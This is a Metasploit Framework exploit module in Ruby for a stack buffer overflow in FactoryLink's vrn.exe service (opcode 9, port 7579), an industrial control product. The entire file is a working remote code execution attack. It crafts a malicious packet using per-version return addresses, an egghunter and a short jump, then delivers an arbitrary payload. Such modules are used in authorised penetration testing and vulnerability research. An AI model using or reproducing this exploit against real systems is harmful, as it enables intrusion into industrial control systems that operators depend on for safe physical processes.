##
# $Id: factorylink_vrn_09.rb 12996 2011-06-21 18:02:35Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FactoryLink vrn.exe Opcode 9 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2, and 8.0.1.703.
					By sending a specially crafted packet, an attacker may be able to execute arbitrary code. 
					Originally found and posted by Luigi Auriemma.
			},
			'Author'         =>
				[ 
					'Luigi Auriemma', # Public exploit
					'hal'             # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12996 $',
			'References'     =>
				[
					['OSVDB', '72815'],
					['URL', 'http://aluigi.altervista.org/adv/factorylink_4-adv.txt']
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 885,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'FactoryLink 7.5',        { 'Ret' => 0x1c0106ac, 'padding' => 0 } ],
					[ 'FactoryLink 7.5 SP2',    { 'Ret' => 0x1c01069c, 'padding' => 0 } ],
					[ 'FactoryLink 8.0.1.703',  { 'Ret' => 0x1c01087c, 'padding' => 4 } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Mar 21 2011'))

		register_options([Opt::RPORT(7579)], self.class)
	end

	def exploit
		connect

		hunter = generate_egghunter(payload.encoded, payload_badchars,
			{ :checksum => true, :startreg => 'ebp'})

		egg = hunter[1]

		header =    "\x3f\x3f\x3f\x3f"
		header <<   "\xff\x55"
		header <<   "\x09\x00"
		header <<   "\x3f\x3f\xff\xff\x00\x00\x3f\x3f"
		header <<   "\x01\x00\x3f\x3f\x3f\x3f\x3f\x3f"
		header <<   "\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
		header <<   "\x3f\x3f"
		header <<   "\xff\xff\xff\xff"
		header <<   "\x3f\x3f"

		request =   header
		request <<  rand_text_alpha_upper(100)
		request <<  egg
		request <<  ("C" * target['padding'])
		request <<  "\xeb\x06\x90\x90"
		request <<  [target.ret].pack('V')
		request <<  "C"*24
		request <<  hunter[0]
		request <<  rand_text_alpha_upper(100000)

		print_status("Trying target #{target.name} with #{request.size} bytes")
		sock.put(request)

		handler
		disconnect
	end
end

